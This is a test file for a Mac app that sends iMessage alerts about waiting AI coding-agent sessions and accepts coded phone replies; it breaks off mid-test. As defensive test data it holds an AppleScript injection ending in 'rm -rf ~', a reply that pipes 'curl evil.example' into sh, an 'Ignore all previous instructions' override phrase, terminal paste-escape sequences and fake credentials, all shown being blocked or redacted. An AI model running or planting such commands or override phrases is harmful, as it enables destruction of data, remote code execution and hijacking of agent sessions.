import { execFileSync } from "child_process";
import * as fs from "fs";
import * as path from "path";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { tempDir } from "./helpers";
import { AwayDetector, type IdleMonitor } from "../src/main/phone/away";
import { ChatDb, ChatDbError, attributedText, CHAT_DB } from "../src/main/phone/chatDb";
import { ANSWER_KEYS, PhoneAlerts } from "../src/main/phone/phoneAlerts";
import { DryRunSender, MessagesSender, SEND_SCRIPT, SendError, sendProblem, type RunFile } from "../src/main/phone/sender";
import { RemoteAudit } from "../src/main/team/remoteAudit";
import { pasteText } from "../src/main/sessions";
import { ALERT_MAX, alertText, hideSecrets, normalizeHandle, parseReply, replyTextProblem, type AlertItem } from "../src/shared/phoneAlerts";
import { auditWords } from "../src/shared/team/audit";
import { DEFAULT_SETTINGS, type SessionInfo, type Settings } from "../src/shared/types";

// ---- fakes ---------------------------------------------------------------------------------

class FakeMonitor implements IdleMonitor {
  idle = 0;
  idleState: "active" | "idle" | "locked" | "unknown" = "active";
  private handlers = new Map<string, (() => void)[]>();
  getSystemIdleTime() {
    return this.idle;
  }
  getSystemIdleState(threshold: number) {
    if (this.idleState === "locked") return "locked";
    return this.idle >= threshold ? "idle" : this.idleState;
  }
  on(event: string, cb: () => void) {
    this.handlers.set(event, [...(this.handlers.get(event) ?? []), cb]);
  }
  emit(event: string) {
    for (const cb of this.handlers.get(event) ?? []) cb();
  }
}

const sess = (id: string, o: Partial<SessionInfo> = {}): SessionInfo => ({
  id,
  title: `Session ${id}`,
  repoPath: null,
  cwd: "/tmp",
  branch: null,
  ticketId: null,
  ticketTitle: null,
  taskGroup: null,
  status: "waiting",
  createdAt: 0,
  kind: "work",
  extraDirs: [],
  waitingReason: "Claude needs your permission to use Bash",
  waitingSince: 1_000,
  ...o,
});

const HANDLE = "me@example.com";

/** Wait, in real time, for `cond`: sqlite3 runs as a real process while the clock is faked. */
async function waitFor(cond: () => boolean, ms = 10_000): Promise<void> {
  const until = performance.now() + ms;
  while (!cond()) {
    if (performance.now() > until) throw new Error("waited too long");
    await new Promise((r) => setImmediate(r));
  }
}

/** A fixture Messages database built from the chat.db schema, filled with made-up conversations. */
class FixtureChatDb {
  readonly file: string;
  constructor(dir = tempDir("messages")) {
    this.file = path.join(dir, "chat.db");
    execFileSync("/usr/bin/sqlite3", [this.file], { input: fs.readFileSync(path.join(__dirname, "fixtures/chatdb/schema.sql"), "utf8") });
  }
  private run(sql: string): string {
    return execFileSync("/usr/bin/sqlite3", [this.file], { input: sql, encoding: "utf8" }).trim();
  }
  private q = (s: string) => `'${s.replace(/'/g, "''")}'`;
  handle(id: string, service = "iMessage"): number {
    return Number(this.run(`INSERT INTO handle (id, service) VALUES (${this.q(id)}, ${this.q(service)}); SELECT last_insert_rowid();`));
  }
  chat(identifier: string, handles: number[], o: { style?: number; service?: string } = {}): number {
    const id = Number(this.run(`INSERT INTO chat (guid, style, chat_identifier, service_name) VALUES (${this.q(`${o.service ?? "iMessage"};-;${identifier}-${Math.random()}`)}, ${o.style ?? 45}, ${this.q(identifier)}, ${this.q(o.service ?? "iMessage")}); SELECT last_insert_rowid();`));
    for (const h of handles) this.run(`INSERT INTO chat_handle_join VALUES (${id}, ${h});`);
    return id;
  }
  message(chat: number, o: { text?: string; body?: Buffer; fromMe?: boolean; handle?: number; service?: string; at?: number; assoc?: number }): number {
    const date = (BigInt(Math.round(o.at ?? Date.now())) - 978_307_200_000n) * 1_000_000n;
    const id = Number(
      this.run(
        `INSERT INTO message (guid, text, attributedBody, handle_id, service, date, is_from_me, associated_message_type) VALUES (${this.q(`g-${Math.random()}`)}, ${o.text === undefined ? "NULL" : this.q(o.text)}, ${o.body ? `X'${o.body.toString("hex")}'` : "NULL"}, ${o.handle ?? 0}, ${this.q(o.service ?? "iMessage")}, ${date}, ${o.fromMe ? 1 : 0}, ${o.assoc ?? 0}); SELECT last_insert_rowid();`
      )
    );
    this.run(`INSERT INTO chat_message_join VALUES (${chat}, ${id}, ${date});`);
    return id;
  }
}

/** An attributedBody as Messages writes it when `text` is empty: typedstream, the string after NSString. */
const typedstream = (s: string): Buffer => {
  const utf8 = Buffer.from(s, "utf8");
  const len = utf8.length < 0x80 ? Buffer.from([utf8.length]) : Buffer.concat([Buffer.from([0x81]), Buffer.from([utf8.length & 0xff, utf8.length >> 8])]);
  return Buffer.concat([Buffer.from("\x04\x0bstreamtyped\x81\xe8\x03\x84\x01@\x84\x84\x84\x12NSAttributedString\x00\x84\x84\x08NSObject\x00\x85\x92\x84\x84\x84\x08NSString\x01\x94\x84\x01+", "latin1"), len, utf8, Buffer.from("\x86\x84\x02iI\x01\x05\x92\x84", "latin1")]);
};

function harness(o: { sessions?: SessionInfo[]; settings?: Partial<Settings>; phone?: Partial<NonNullable<Settings["phoneAlerts"]>>; replies?: ChatDb | null; send?: (h: string, t: string) => Promise<void> } = {}) {
  const sent: { handle: string; text: string }[] = [];
  const settings: Settings = { ...DEFAULT_SETTINGS, ...o.settings, phoneAlerts: { enabled: true, handle: HANDLE, idleMinutes: 10, finished: true, replies: false, ...o.phone } };
  const list = o.sessions ?? [];
  const away = { away: true, why: "locked" as "locked" | "idle" | "manual" | null, idleSeconds: 900 };
  const writes: { id: string; data: string }[] = [];
  const delivered: { id: string; text: string }[] = [];
  const notes: { id: string; text: string }[] = [];
  const logs: string[] = [];
  const warnings: string[] = [];
  const auditFile = path.join(tempDir("audit"), "audit.log");
  const audit = new RemoteAudit({ file: auditFile, log: (c, e) => logs.push(`${c}: ${e}`) });
  const codes = ["K4", "M7", "P3", "T9", "W6"];
  const alerts = new PhoneAlerts({
    settings: () => settings,
    away: () => away,
    sender: { send: o.send ?? (async (handle, text) => void sent.push({ handle, text })) },
    replies: o.replies ?? null,
    sessions: {
      list: () => list,
      write: (id, data) => void writes.push({ id, data }),
      deliver: (id, text) => (delivered.push({ id, text }), "delivered"),
      note: (id, text) => void notes.push({ id, text }),
    },
    audit,
    log: (c, e) => void logs.push(`${c}: ${(e as Error).message ?? e}`),
    info: (line) => void logs.push(line),
    warn: (t, b) => void warnings.push(`${t}: ${b}`),
    code: () => codes.shift() ?? "Y3",
    timing: { batchMs: 1_000, perSessionMs: 10 * 60_000, gapMs: 5_000, pollMs: 1_000, openMs: 3_600_000 },
  });
  return { alerts, sent, settings, list, away, writes, delivered, notes, logs, warnings, audit };
}

beforeEach(() => {
  vi.useFakeTimers({ now: new Date(2026, 9, 26, 12, 0), toFake: ["setTimeout", "clearTimeout", "setInterval", "clearInterval", "Date"] });
});
afterEach(() => {
  vi.useRealTimers();
});

// ---- away -----------------------------------------------------------------------------------

describe("away from the Mac", () => {
  it("is away when the screen locks or input has been idle for the chosen minutes, and back on unlock or input", () => {
    const m = new FakeMonitor();
    let minutes = 10;
    const away = new AwayDetector({ monitor: m, idleMinutes: () => minutes });
    const changes: boolean[] = [];
    const off = away.onChange((a) => changes.push(a.away), 1_000);
    expect(away.state()).toEqual({ away: false, why: null, idleSeconds: 0 });
    m.idle = 9 * 60;
    expect(away.isAway()).toBe(false);
    m.idle = 10 * 60;
    expect(away.state().why).toBe("idle");
    minutes = 15; // the setting applies at once
    expect(away.isAway()).toBe(false);
    m.idle = 0;
    m.idleState = "locked";
    m.emit("lock-screen");
    expect(away.state().why).toBe("locked");
    m.idleState = "active";
    m.emit("unlock-screen");
    expect(away.isAway()).toBe(false);
    expect(changes).toEqual([true, false]);
    off();
  });

  it("counts a lock its event missed, and stays locked through input at the lock screen until unlock", () => {
    const m = new FakeMonitor();
    const away = new AwayDetector({ monitor: m, idleMinutes: () => 10 });
    m.idleState = "locked"; // locked before it listened
    expect(away.state().why).toBe("locked");
    m.idleState = "active";
    m.emit("lock-screen");
    m.idle = 0; // a password typed at the lock screen
    expect(away.state().why).toBe("locked");
    m.emit("unlock-screen");
    expect(away.isAway()).toBe(false);
  });

  it("counts the user's own \"I'm away\" when one is given", () => {
    const m = new FakeMonitor();
    let manual = false;
    const away = new AwayDetector({ monitor: m, idleMinutes: () => 10, manual: () => manual });
    expect(away.isAway()).toBe(false);
    manual = true;
    expect(away.state().why).toBe("manual");
  });

  it("checks on a timer while it's listened to, so idling into away is heard", async () => {
    const m = new FakeMonitor();
    const away = new AwayDetector({ monitor: m, idleMinutes: () => 1 });
    const seen: string[] = [];
    const off = away.onChange((a) => seen.push(String(a.why)), 1_000);
    m.idle = 61;
    await vi.advanceTimersByTimeAsync(1_000);
    expect(seen).toEqual(["idle"]);
    off();
  });
});

// ---- alerts: when, how often, batched --------------------------------------------------------

describe("phone alerts", () => {
  it("sends one alert when a session starts waiting while you're away, not while you're here", async () => {
    const s1 = sess("s1");
    const h = harness({ sessions: [s1] });
    h.away.away = false;
    h.alerts.sessionStatus(s1, "waiting");
    await vi.advanceTimersByTimeAsync(5_000);
    expect(h.sent).toEqual([]);
    h.away.away = true;
    h.alerts.sessionStatus(s1, "waiting");
    await vi.advanceTimersByTimeAsync(1_000);
    expect(h.sent).toHaveLength(1);
    expect(h.sent[0].handle).toBe(HANDLE);
    expect(h.sent[0].text).toBe("Mockingbird: “Session s1” needs permission: Bash.");
  });

  it("batches sessions that wait close together into one message", async () => {
    const list = [sess("s1"), sess("s2", { waitingReason: "Claude has a question" }), sess("s3", { status: "idle", waitingReason: null, waitingSince: null })];
    const h = harness({ sessions: list });
    h.alerts.sessionStatus(list[0], "waiting");
    await vi.advanceTimersByTimeAsync(400);
    h.alerts.sessionStatus(list[1], "waiting");
    h.alerts.sessionStatus(list[2], "idle");
    await vi.advanceTimersByTimeAsync(1_000);
    expect(h.sent).toHaveLength(1);
    expect(h.sent[0].text.split("\n")).toEqual([
      "Mockingbird: 3 sessions, 2 waiting on you",
      "• “Session s1” needs permission: Bash",
      "• “Session s2” has a question for you",
      "• “Session s3” finished",
    ]);
  });

  it("alerts a session at most once per 10 minutes, and a prompt once", async () => {
    const s1 = sess("s1");
    const h = harness({ sessions: [s1] });
    h.alerts.sessionStatus(s1, "waiting");
    await vi.advanceTimersByTimeAsync(1_000);
    h.alerts.sessionStatus(s1, "waiting"); // the same prompt again
    await vi.advanceTimersByTimeAsync(10_000);
    expect(h.sent).toHaveLength(1);
    // a new prompt 3 minutes on: within the 10 minutes
    vi.setSystemTime(Date.now() + 3 * 60_000);
    s1.waitingSince = Date.now();
    h.alerts.sessionStatus(s1, "waiting");
    await vi.advanceTimersByTimeAsync(10_000);
    expect(h.sent).toHaveLength(1);
    expect(h.logs.some((l) => /not alerting s1 again/.test(l))).toBe(true);
    // past the 10 minutes, a new prompt is alerted
    vi.setSystemTime(Date.now() + 8 * 60_000);
    s1.waitingSince = Date.now();
    h.alerts.sessionStatus(s1, "waiting");
    await vi.advanceTimersByTimeAsync(10_000);
    expect(h.sent).toHaveLength(2);
  });

  it("never alerts the same prompt twice, however long it waits", async () => {
    const s1 = sess("s1");
    const h = harness({ sessions: [s1] });
    h.alerts.sessionStatus(s1, "waiting");
    await vi.advanceTimersByTimeAsync(1_000);
    vi.setSystemTime(Date.now() + 30 * 60_000);
    h.alerts.awayChanged({ away: true, why: "locked", idleSeconds: 0 }); // locked again: still waiting on the same prompt
    await vi.advanceTimersByTimeAsync(10_000);
    expect(h.sent).toHaveLength(1);
  });

  it("keeps messages apart: one that comes soon after another waits out the gap and takes everything since", async () => {
    const list = [sess("s1"), sess("s2"), sess("s3")];
    const h = harness({ sessions: list });
    h.alerts.sessionStatus(list[0], "waiting");
    await vi.advanceTimersByTimeAsync(1_000);
    expect(h.sent).toHaveLength(1);
    h.alerts.sessionStatus(list[1], "waiting");
    await vi.advanceTimersByTimeAsync(1_500);
    h.alerts.sessionStatus(list[2], "waiting");
    await vi.advanceTimersByTimeAsync(1_000);
    expect(h.sent).toHaveLength(1); // the 5 s gap since the first isn't over
    await vi.advanceTimersByTimeAsync(3_000);
    expect(h.sent).toHaveLength(2);
    expect(h.sent[1].text).toMatch(/^Mockingbird: 2 sessions/);
  });

  it("holds alerts in quiet hours, for muted sessions, finished turns when those are off, and when alerts are off", async () => {
    const s1 = sess("s1");
    const muted = sess("s2", { muted: true });
    const done = sess("s3", { status: "idle", waitingReason: null, waitingSince: null });
    const shell = sess("s4", { shell: true });
    const h = harness({ sessions: [s1, muted, done, shell], phone: { finished: false }, settings: { quietHours: { enabled: true, from: "11:00", to: "13:00" } } });
    h.alerts.sessionStatus(s1, "waiting");
    await vi.advanceTimersByTimeAsync(5_000);
    expect(h.sent).toEqual([]);
    h.settings.quietHours = { enabled: false, from: "11:00", to: "13:00" };
    h.alerts.sessionStatus(muted, "waiting");
    h.alerts.sessionStatus(done, "idle");
    h.alerts.sessionStatus(shell, "waiting");
    await vi.advanceTimersByTimeAsync(5_000);
    expect(h.sent).toEqual([]);
    h.settings.phoneAlerts!.enabled = false;
    h.alerts.sessionStatus(s1, "waiting");
    await vi.advanceTimersByTimeAsync(5_000);
    expect(h.sent).toEqual([]);
    h.settings.phoneAlerts!.enabled = true;
    h.settings.phoneAlerts!.handle = "555 1234"; // no country code: not a handle
    h.alerts.sessionStatus(s1, "waiting");
    await vi.advanceTimersByTimeAsync(5_000);
    expect(h.sent).toEqual([]);
  });

  it("drops what's pending when you come back, and leaves out a session answered meanwhile", async () => {
    const s1 = sess("s1");
    const s2 = sess("s2");
    const h = harness({ sessions: [s1, s2] });
    h.alerts.sessionStatus(s1, "waiting");
    h.away.away = false;
    h.alerts.awayChanged({ away: false, why: null, idleSeconds: 0 });
    await vi.advanceTimersByTimeAsync(5_000);
    expect(h.sent).toEqual([]);
    h.away.away = true;
    h.alerts.sessionStatus(s1, "waiting");
    h.alerts.sessionStatus(s2, "waiting");
    s1.status = "working"; // answered at the Mac before the batch went
    await vi.advanceTimersByTimeAsync(1_000);
    expect(h.sent).toHaveLength(1);
    expect(h.sent[0].text).toContain("Session s2");
    expect(h.sent[0].text).not.toContain("Session s1");
  });

  it("alerts sessions already waiting when you become away", async () => {
    const s1 = sess("s1");
    const h = harness({ sessions: [s1, sess("s2", { status: "working" })] });
    h.alerts.awayChanged({ away: true, why: "idle", idleSeconds: 600 });
    await vi.advanceTimersByTimeAsync(1_000);
    expect(h.sent).toHaveLength(1);
    expect(h.sent[0].text).toContain("Session s1");
  });

  it("says plainly when Messages refuses, logs it, records it, and warns once", async () => {
    const s1 = sess("s1");
    const s2 = sess("s2");
    const h = harness({ sessions: [s1, s2], send: async () => Promise.reject(sendProblem("execution error: Not authorized to send Apple events to Messages. (-1743)")) });
    h.alerts.sessionStatus(s1, "waiting");
    await vi.advanceTimersByTimeAsync(1_000);
    const st = h.alerts.status();
    expect(st.last).toMatchObject({ ok: false, test: false });
    expect(st.last!.detail).toMatch(/isn't allowed to control Messages.*Automation/);
    expect(h.logs.some((l) => l.startsWith("phone alerts: sending:"))).toBe(true);
    expect(h.warnings).toHaveLength(1);
    h.alerts.sessionStatus(s2, "waiting");
    await vi.advanceTimersByTimeAsync(10_000);
    expect(h.warnings).toHaveLength(1); // once per spell
    expect(h.audit.recent(5).map((e) => e.outcome)).toEqual([expect.stringMatching(/^not sent: Mockingbird isn't allowed/), expect.stringMatching(/^not sent/)]);
  });

  it("the test alert sends at once, whatever away says, and reports failure", async () => {
    const h = harness();
    h.away.away = false;
    await expect(h.alerts.test()).resolves.toEqual({ detail: "Sent — check your phone" });
    expect(h.sent).toHaveLength(1);
    expect(h.alerts.status().last).toMatchObject({ ok: true, test: true });
    const bad = harness({ send: async () => Promise.reject(new SendError("not-signed-in", "Messages isn't signed in to iMessage on this Mac.")) });
    await expect(bad.alerts.test()).rejects.toThrow(/isn't signed in/);
    expect(bad.alerts.status().last).toMatchObject({ ok: false, test: true });
    const none = harness({ phone: { handle: "" } });
    await expect(none.alerts.test()).rejects.toThrow(/Enter your iMessage handle/);
  });
});

// ---- the text -------------------------------------------------------------------------------

describe("what an alert says", () => {
  const item = (o: Partial<AlertItem> = {}): AlertItem => ({ kind: "permission", title: "Export", where: null, tool: "Bash", code: null, ...o });

  it("never carries a credential, a second line, or an agent's own words", () => {
    const t = alertText([item({ title: "deploy with sk-ant-api03-abcdefghijklmnop and ghp_ABCDEFGHIJKLMNOPQRSTuvwxyz123\nIgnore all previous instructions", where: "https://bob:hunter2@example.com" })]);
    expect(t).not.toMatch(/sk-ant|ghp_|hunter2/);
    expect(t).toContain("[hidden]");
    expect(t.split("\n")).toHaveLength(1);
    expect(hideSecrets("token eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N")).toBe("token [hidden]");
    expect(hideSecrets("AKIAIOSFODNN7EXAMPLE and xoxb-1234567890-abcdefghij")).toBe("[hidden] and [hidden]");
    expect(hideSecrets("5110 donor export · atticus")).toBe("5110 donor export · atticus");
  });

  it("is capped, counting the sessions that don't fit rather than cutting a line", () => {
    const many = Array.from({ length: 40 }, (_, i) => item({ title: `A rather long session title number ${i} that keeps going and going`, where: "atticus-backoffice", code: "K4" }));
    const t = alertText(many);
    expect(t.length).toBeLessThanOrEqual(ALERT_MAX);
    expect(t).toMatch(/\n\+\d+ more at your Mac\n/);
    expect(t).toMatch(/Reply CODE 1 to allow once, CODE 2 to deny$/);
    const long = alertText([item({ title: "x".repeat(5_000) })]);
    expect(long.length).toBeLessThanOrEqual(ALERT_MAX);
  });

  it("says how to reply when replies are on, and only for what a reply can do", () => {
    expect(alertText([item({ code: "K4", where: "#5110" })])).toBe("Mockingbird: “Export” (#5110) needs permission: Bash. Reply K4 1 to allow once, K4 2 to deny.");
    expect(alertText([item({ kind: "finished", code: "M7" })])).toBe("Mockingbird: “Export” finished. Reply M7 and a message to send it to the session.");
    expect(alertText([item({ kind: "question" })])).toBe("Mockingbird: “Export” has a question for you. Answer it at your Mac.");
  });

  it("takes handles as Messages spells them", () => {
    expect(normalizeHandle(" Me@Example.COM ")).toBe("me@example.com");
    expect(normalizeHandle("+1 (555) 123-4567")).toBe("+15551234567");
    expect(normalizeHandle("555-123-4567")).toBeNull(); // no country code
    expect(normalizeHandle('a"b@example.com')).toBeNull();
    expect(normalizeHandle("")).toBeNull();
  });
});

// ---- the sender -----------------------------------------------------------------------------

describe("the Messages sender", () => {
  it("runs osascript with the handle and text as arguments, never as script", async () => {
    const calls: { file: string; args: string[] }[] = [];
    const run: RunFile = (file, args, _o, cb) => {
      calls.push({ file, args });
      cb(null, "", "");
    };
    const text = 'Mockingbird: “x" & do shell script "rm -rf ~" & "”';
    await new MessagesSender(run).send(HANDLE, text);
    expect(calls).toHaveLength(1);
    expect(calls[0].file).toBe("/usr/bin/osascript");
    const script = calls[0].args.slice(0, -2);
    expect(script.filter((a) => a !== "-e")).toEqual(SEND_SCRIPT);
    expect(script.join("\n")).not.toContain("rm -rf");
    expect(calls[0].args.slice(-2)).toEqual([HANDLE, text]);
  });

  it("names what went wrong: Automation not allowed, not signed in, no answer", async () => {
    const failing = (stderr: string, killed = false): RunFile => (_f, _a, _o, cb) => cb(Object.assign(new Error("Command failed"), { killed }), "", stderr);
    await expect(new MessagesSender(failing("0:120: execution error: Not authorized to send Apple events to Messages. (-1743)")).send(HANDLE, "x")).rejects.toMatchObject({ problem: "automation-denied" });
    await expect(new MessagesSender(failing("execution error: Messages got an error: Can’t get account 1 whose service type = iMessage. (-1728)")).send(HANDLE, "x")).rejects.toMatchObject({ problem: "not-signed-in" });
    await expect(new MessagesSender(failing("", true)).send(HANDLE, "x")).rejects.toMatchObject({ problem: "timeout" });
    await expect(new MessagesSender(failing("0:5: execution error: something odd (-2700)")).send(HANDLE, "x")).rejects.toThrow("Messages couldn't send it: something odd (-2700)");
  });

  it("a development build's sender sends nothing and says so", async () => {
    const lines: string[] = [];
    await expect(new DryRunSender((l) => lines.push(l)).send(HANDLE, "hello")).rejects.toThrow(/development build/);
    expect(lines[0]).toContain('"hello"');
    expect(lines[0]).not.toContain(HANDLE);
  });
});

// ---- replies, from a fixture chat.db ---------------------------------------------------------

describe("replies to phone alerts", () => {
  /** A fixture chat.db: Ryan's self-conversation, a friend's chat, a group chat with both, and an SMS self-thread. */
  function messages() {
    const db = new FixtureChatDb();
    const me = db.handle(HANDLE);
    const meSms = db.handle(HANDLE, "SMS");
    const friend = db.handle("friend@example.com");
    const self = db.chat(HANDLE, [me]);
    const friendChat = db.chat("friend@example.com", [friend]);
    const group = db.chat("chat123456", [me, friend], { style: 43 });
    const sms = db.chat(HANDLE, [meSms], { service: "SMS" });
    const earlier = db.message(self, { text: "K4 1", fromMe: true, at: Date.now() - 60 * 60_000 });
    return { db, me, friend, self, friendChat, group, sms, earlier };
  }

  async function withAlert(o: { sessions: SessionInfo[]; kinds?: ("waiting" | "idle")[] }) {
    const f = messages();
    const h = harness({ sessions: o.sessions, phone: { replies: true }, replies: new ChatDb(f.db.file) });
    o.sessions.forEach((s, i) => h.alerts.sessionStatus(s, o.kinds?.[i] ?? "waiting"));
    await vi.advanceTimersByTimeAsync(1_000);
    await waitFor(() => h.sent.length > 0);
    expect(h.sent).toHaveLength(1);
    return { ...f, ...h };
  }

  const poll = async (h: { alerts: PhoneAlerts }) => {
    vi.setSystemTime(Date.now() + 5_000);
    await h.alerts.poll();
  };

  it("allows a waiting prompt once from a reply in the self-conversation that names its code", async () => {
    const s1 = sess("s1");
    const t = await withAlert({ sessions: [s1] });
    expect(t.sent[0].text).toContain("Reply K4 1 to allow once");
    t.db.message(t.self, { text: "k4 1", fromMe: true, at: Date.now() + 1_000 });
    await poll(t);
    expect(t.writes).toEqual([{ id: "s1", data: ANSWER_KEYS.allow.claude }]);
    expect(t.notes).toEqual([{ id: "s1", text: "Answered from your phone: allow once" }]);
    expect(t.sent.at(-1)!.text).toBe("Mockingbird: done — allow once in “Session s1”.");
    // the code is spent: the same reply again does nothing
    t.db.message(t.self, { text: "K4 1", fromMe: true, at: Date.now() + 40_000 });
    await poll(t);
    expect(t.writes).toHaveLength(1);
  });

  it("denies with Esc — never the 2 that Claude Code's menu can make \"don't ask again\" — and answers Codex with its own key", async () => {
    const s1 = sess("s1");
    const s2 = sess("s2", { agent: "codex", waitingReason: "Codex needs your permission to use exec_command" });
    const t = await withAlert({ sessions: [s1, s2] });
    t.db.message(t.self, { text: "K4 2", fromMe: true, at: Date.now() + 1_000 });
    t.db.message(t.self, { text: "1 M7", fromMe: true, at: Date.now() + 2_000 });
    await poll(t);
    expect(t.writes).toEqual([
      { id: "s1", data: "\x1b" },
      { id: "s2", data: "y" },
    ]);
    expect(Object.values(ANSWER_KEYS).flatMap((k) => Object.values(k))).not.toContain("2");
  });

  it("ignores the same words anywhere but the self-conversation: a friend, a group chat, an SMS thread", async () => {
    const t = await withAlert({ sessions: [sess("s1")] });
    t.db.message(t.friendChat, { text: "K4 1", handle: t.friend, at: Date.now() + 1_000 });
    t.db.message(t.group, { text: "K4 1", handle: t.friend, at: Date.now() + 1_000 });
    t.db.message(t.group, { text: "K4 1", fromMe: true, at: Date.now() + 1_000 });
    t.db.message(t.sms, { text: "K4 1", service: "SMS", at: Date.now() + 1_000 });
    // someone else's handle on a row in the self-chat (it can't happen through iMessage; the check holds anyway)
    t.db.message(t.self, { text: "K4 1", handle: t.friend, at: Date.now() + 1_000 });
    // an SMS row in the self-chat
    t.db.message(t.self, { text: "K4 1", fromMe: true, service: "SMS", at: Date.now() + 1_000 });
    // a tapback on the alert
    t.db.message(t.self, { text: "K4 1", fromMe: true, assoc: 2000, at: Date.now() + 1_000 });
    await poll(t);
    expect(t.writes).toEqual([]);
    expect(t.audit.recent(10).filter((e) => e.kind === "phone.reply")).toEqual([]);
  });

  it("ignores a chat named like the self-conversation when someone else is in it, or that isn't one-to-one", async () => {
    const f = messages();
    const shared = f.db.chat(HANDLE, [f.me, f.friend]);
    const group = f.db.chat(HANDLE, [f.me], { style: 43 });
    const h = harness({ sessions: [sess("s1")], phone: { replies: true }, replies: new ChatDb(f.db.file) });
    h.alerts.sessionStatus(h.list[0], "waiting");
    await vi.advanceTimersByTimeAsync(1_000);
    await waitFor(() => h.sent.length > 0);
    f.db.message(shared, { text: "K4 1", handle: f.friend, at: Date.now() + 1_000 });
    f.db.message(shared, { text: "K4 1", handle: f.me, at: Date.now() + 1_000 });
    f.db.message(group, { text: "K4 1", fromMe: true, at: Date.now() + 1_000 });
    await poll(h);
    expect(h.writes).toEqual([]);
  });

  it("ignores messages from before the alert, notes to self, and codes no alert has", async () => {
    const t = await withAlert({ sessions: [sess("s1")] });
    // the reply from an hour ago (row `earlier`) names the code too
    t.db.message(t.self, { text: "buy milk", fromMe: true, at: Date.now() + 1_000 });
    t.db.message(t.self, { text: "A3 1", fromMe: true, at: Date.now() + 1_000 });
    t.db.message(t.self, { text: t.sent[0].text, fromMe: true, at: Date.now() + 1_000 }); // the alert itself, as the self-thread holds it
    await poll(t);
    expect(t.writes).toEqual([]);
    expect(t.logs.some((l) => /code A3, which no open alert has/.test(l))).toBe(true);
  });

  it("refuses to answer a prompt that changed since the alert", async () => {
    const s1 = sess("s1");
    const t = await withAlert({ sessions: [s1] });
    s1.waitingSince = Date.now(); // answered at the Mac, and a new prompt came up
    s1.waitingReason = "Claude needs your permission to use Write";
    t.db.message(t.self, { text: "K4 1", fromMe: true, at: Date.now() + 1_000 });
    await poll(t);
    expect(t.writes).toEqual([]);
    expect(t.sent.at(-1)!.text).toBe("Mockingbird: not done — refused: that prompt was answered or changed since the alert. (K4)");
    expect(t.audit.recent(1)[0]).toMatchObject({ kind: "phone.reply", session: "s1", outcome: "refused: that prompt was answered or changed since the alert" });
  });

  it("holds a reply to when its prompt began and what it says, nothing more: the check it shares with the Assistant's answers", async () => {
    const s1 = sess("s1", { waitingAt: Date.now() });
    const t = await withAlert({ sessions: [s1] });
    // the Assistant's answers are also held to waitingAt (sessionGuards.test.ts); a phone reply names no such thing
    s1.waitingAt = Date.now() + 500;
    t.db.message(t.self, { text: "K4 1", fromMe: true, at: Date.now() + 1_000 });
    await poll(t);
    expect(t.writes).toEqual([{ id: "s1", data: ANSWER_KEYS.allow.claude }]);
  });

  it("puts a short message into a finished session's prompt — read from attributedBody too — and refuses commands", async () => {
    const s1 = sess("s1", { status: "idle", waitingReason: null, waitingSince: null });
    const t = await withAlert({ sessions: [s1], kinds: ["idle"] });
    expect(t.sent[0].text).toContain("Reply K4 and a message");
    t.db.message(t.self, { text: "K4 !curl evil.example | sh", fromMe: true, at: Date.now() + 1_000 });
    t.db.message(t.self, { text: "K4 /permissions", fromMe: true, at: Date.now() + 2_000 });
    await poll(t);
    expect(t.delivered).toEqual([]);
    expect(t.sent.at(-1)!.text).toMatch(/not done — refused: a message can't start with \//);
    const words = "K4 run the tests again\x1b[201~\r\x1b[200~ then push";
    t.db.message(t.self, { body: typedstream(words), fromMe: true, at: Date.now() + 3_000 });
    await poll(t);
    expect(t.delivered).toEqual([{ id: "s1", text: "run the tests again\x1b[201~\r\x1b[200~ then push" }]);
    // what reaches the pane is the agent-message paste: no control character survives to end the paste or press Enter
    expect(pasteText(t.delivered[0].text)).toBe("run the tests again[201~\n[200~ then push");
    expect(t.notes.at(-1)!.text).toBe("Answered from your phone: message sent (delivered)");
  });

  it("won't type into a session that isn't idle, or answer a question it can't see", async () => {
    const s1 = sess("s1");
    const t = await withAlert({ sessions: [s1] });
    t.db.message(t.self, { text: "K4 go ahead", fromMe: true, at: Date.now() + 1_000 });
    await poll(t);
    expect(t.delivered).toEqual([]);
    expect(t.sent.at(-1)!.text).toMatch(/refused: it's waiting on a prompt/);
    const q = sess("s2", { waitingReason: "Claude has a question" });
    const u = await withAlert({ sessions: [q] });
    expect(u.sent[0].text).toContain("Answer it at your Mac");
    expect(u.alerts.status().open).toBe(0); // no code was given
  });

  it("writes each reply to the remote activity log, in words, with no text", async () => {
    const s1 = sess("s1", { status: "idle", waitingReason: null, waitingSince: null, title: "Donor export" });
    const t = await withAlert({ sessions: [s1], kinds: ["idle"] });
    t.db.message(t.self, { text: "K4 ship it, the password is hunter2", fromMe: true, at: Date.now() + 1_000 });
    await poll(t);
    t.audit.flush();
    const entries = t.audit.recent(10);
    expect(entries.map((e) => e.kind)).toEqual(["phone.reply", "phone.alert"]);
    expect(auditWords(entries[1])).toBe("Phone alert about “Donor export”: sent");
    expect(auditWords(entries[0])).toBe("From your phone, “Donor export”: message sent (delivered) (32 bytes)");
    expect(fs.readFileSync(path.join(path.dirname(t.audit.file), "audit.log"), "utf8")).not.toContain("hunter2");
  });

  it("stops reading Messages once replies are turned off, and forgets the codes", async () => {
    const t = await withAlert({ sessions: [sess("s1")] });
    expect(t.alerts.status().open).toBe(1);
    const read = vi.spyOn(ChatDb.prototype, "selfMessages");
    t.settings.phoneAlerts!.replies = false;
    t.alerts.settingsChanged();
    expect(t.alerts.status()).toMatchObject({ open: 0, replies: { state: "off" } });
    t.db.message(t.self, { text: "K4 1", fromMe: true, at: Date.now() + 1_000 });
    await vi.advanceTimersByTimeAsync(10_000);
    await t.alerts.poll();
    expect(read).not.toHaveBeenCalled();
    expect(t.writes).toEqual([]);
    read.mockRestore();
  });

  it("polls on its own while an alert is open", async () => {
    const t = await withAlert({ sessions: [sess("s1")] });
    t.db.message(t.self, { text: "K4 1", fromMe: true, at: Date.now() + 500 });
    await vi.advanceTimersByTimeAsync(1_000);
    await waitFor(() => t.writes.length > 0);
    expect(t.writes).toHaveLength(1);
  });

  it("says when macOS won't let it read Messages, without codes in alerts", async () => {
    const run = (_f: string, _a: string[], _o: unknown, cb: (e: Error | null, out: string, err: string) => void) =>
      cb(new Error("failed"), "", 'Error: unable to open database "/Users/x/Library/Messages/chat.db": authorization denied');
    const h = harness({ sessions: [sess("s1")], phone: { replies: true }, replies: new ChatDb(path.join(tempDir("nodb"), "chat.db"), run as never) });
